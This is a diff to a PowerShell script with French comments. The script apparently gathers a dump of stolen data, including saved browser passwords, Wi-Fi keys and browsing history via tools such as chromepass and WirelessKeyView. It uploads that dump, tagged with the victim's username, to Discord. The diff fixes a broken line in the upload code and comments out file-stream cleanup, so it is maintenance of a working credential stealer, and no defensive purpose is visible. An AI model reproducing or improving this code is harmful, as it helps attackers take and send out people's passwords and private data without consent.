@@ -87,7 +87,8 @@ $content = New-Object System.Net.Http.MultipartFormDataContent
 $content.Add((New-Object System.Net.Http.StringContent("Data from $env:USERNAME")), "content")
 
 $fileStream = [System.IO.File]::OpenRead("$dumpFile")
-$fileContent = New-Object System.Net.Http.StreamContent($fileStream)$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
 $content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))
 
 try { 
@@ -97,10 +98,10 @@ try {
     Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
 }
 
-if ($fileStream) {
-    $fileStream.Close()
-    $fileStream.Dispose()
-}
+#if ($fileStream) {
+#    $fileStream.Close()
+#    $fileStream.Dispose()
+#}
 
 # Nettoyage final sécurisé
 Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
